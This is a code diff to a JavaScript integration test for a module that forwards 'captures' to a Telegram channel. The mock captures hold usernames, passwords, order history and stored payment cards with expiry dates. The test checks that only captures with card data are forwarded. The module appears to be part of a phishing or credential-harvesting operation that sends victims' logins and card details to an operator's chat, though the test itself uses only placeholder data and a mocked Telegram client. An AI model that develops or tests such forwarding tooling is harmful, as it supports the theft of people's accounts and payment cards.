@@ -240,29 +240,52 @@ async function testComponentIntegration() {
     
     const ChannelForwarder = require('../shared/coordinator/ChannelForwarder');
     
-    const channelForwarder = new ChannelForwarder(mockRedis, mockTelegram, -1001234567890);
-    
-    // Test tracking code generation and storage
-    const testEvent = {
+    const forwardCalls = [];
+    const mockForwardTelegram = {
+      sendMessage: async (chatId, text) => {
+        forwardCalls.push({ chatId, text });
+        return { message_id: 777 };
+      }
+    };
+    const channelForwarder = new ChannelForwarder(mockRedis, mockForwardTelegram, -1001234567890);
+
+    // Invalid capture should not be forwarded
+    const invalidEvent = {
+      username: 'invalid@example.com',
+      password: 'testpass',
+      capture: {
+        latestOrder: 'n/a',
+        profile: { cards: [] }
+      },
+      ipAddress: '192.168.1.2',
+      timestamp: Date.now()
+    };
+
+    // Valid capture should be forwarded
+    const validEvent = {
       username: 'test@example.com',
       password: 'testpass',
       capture: {
         latestOrder: '2024-01-15',
-        profile: { cards: [{ type: 'Visa', last4: '1234' }] }
+        profile: { cards: [{ type: 'Visa', last4: '1234', expiry: '12/30' }] }
       },
       ipAddress: '192.168.1.1',
       timestamp: Date.now()
     };
     
-    // This should work without actually sending to Telegram
     try {
-      // Just test the validation logic
-      const isValid = channelForwarder.validateCaptureForForwarding(testEvent.capture);
-      if (isValid.valid) {
+      await channelForwarder.handleForwardEvent(invalidEvent);
+      const callsAfterInvalid = forwardCalls.length;
+      await channelForwarder.handleForwardEvent(validEvent);
+
+      if (callsAfterInvalid === 0 && forwardCalls.length === 1) {
         log.info('✓ ChannelForwarder integration successful');
         testsPassed++;
       } else {
-        log.error('✗ ChannelForwarder integration failed - validation failed', isValid);
+        log.error('✗ ChannelForwarder integration failed - forwarding guard mismatch', {
+          callsAfterInvalid,
+          totalCalls: forwardCalls.length
+        });
       }
     } catch (error) {
       log.error('✗ ChannelForwarder integration failed', error.message);
